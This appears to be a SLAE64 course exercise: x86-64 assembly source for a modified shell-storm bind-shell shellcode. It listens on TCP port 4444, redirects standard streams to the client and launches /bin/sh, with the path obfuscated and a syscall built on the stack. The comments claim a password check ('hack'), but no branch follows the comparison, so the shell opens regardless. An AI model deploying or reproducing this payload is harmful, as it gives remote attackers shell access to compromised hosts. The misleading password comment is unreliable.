;Original Shellcode : http://shell-storm.org/shellcode/files/shellcode-870.php
;Bind_shell_TCP with password
;modified by Sathish Kumar L SLAE64 - 1408
;original lenght = 175 bytes
;modified length = 137 bytes

global _start

_start:
    
    xor rax, rax    ;Xor function will null the values in the register beacuse we doesn't know whats the value in the register in realtime cases
	xor rsi, rsi 
	mul rsi
	add rcx, 0x3       
	push byte 0x2   ; pusing argument to the stack
	pop rdi         ; poping the argument to the rdi instructions on the top of the stack should be remove first because stack LIFO
	inc esi         ; already rsi is 0 so incrementing the rsi register will make it 1
	push byte 0x29  ; pushing the syscall number into the rax by using stack
	pop rax
	syscall
	
	; copying the socket descripter from rax to rdi register so that we can use it further 

	xchg rax, rdi
	
	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)
	; setting up the data sctructure
	
	push 0x2			             ;AF_INET value is 2 so we are pushing 0x2
    mov word [rsp + 2],0x5c11        ;port 4444 htons hex value is 0x5c11 port values can be be obtained by following above instructions 
    push rcx
    pop rcx
    push rsp                         ; saving the complete argument to rsi register
    pop rsi  						 
    
    
	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49
	
	push rdx          				; Inserting the null to the stack 
	push byte 0x10                  
	pop rdx
	add rcx, r10							; value of the rdx register is set to 16 size sockaddr
	push byte 0x31                   
	pop rax							; rax register is set with 49 syscall for bind
	syscall
	
	;listen the sockets for the incomming connections	 
	; listen(sock, MAX_CLIENTS)
	; syscall number 50
	
	pop rsi
	push 0x32
	not rcx
	pop rax                          ; rax register is set to 50 syscall for listen
	syscall
	
	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
 	;syscall number 43
 	
 	push 0x2b
	pop rax                           ; rax register is set to 43 syscall for accept
 	syscall
 	
 	; storing the client socket description
	mov r9, rax
	
	; close parent
	push 0x3
	pop rax                            ; closing the parent socket connection using close parent rax is set to 3 syscall to close parent
	syscall

	xchg rdi , r9
	xor rsi , rsi

	; initilization of dup2
	push 0x3                           
	pop rsi								; setting argument to 3 



duplicate:
    dec esi                            
    mov al, 0x21                       ;duplicate syscall applied to error,output and input using loop
    syscall
    jne duplicate
    
password_check:
	
	push rsp
	pop rsi
	xor rax, rax   ; system read syscall value is 0 so rax is set to 0
	syscall
	push 0x6b636168 ; password to connect to shell is hack which is pushed in reverse and hex encoded
	pop rax
	lea rdi, [rel rsi]
	scasd           ; comparing the user input and stored password in the stack
	
execve:                                      
    xor esi, esi
    xor r15, r15
    mov r15w, 0x161f
    sub r15w, 0x1110
    push r15
    mov r15, rsp
    mov rdi, 0xff978cd091969dd0
    inc rdi
    neg rdi
    mul esi
    add al, 0x3b
    push rdi
    push rsp
    pop rdi
    call r15

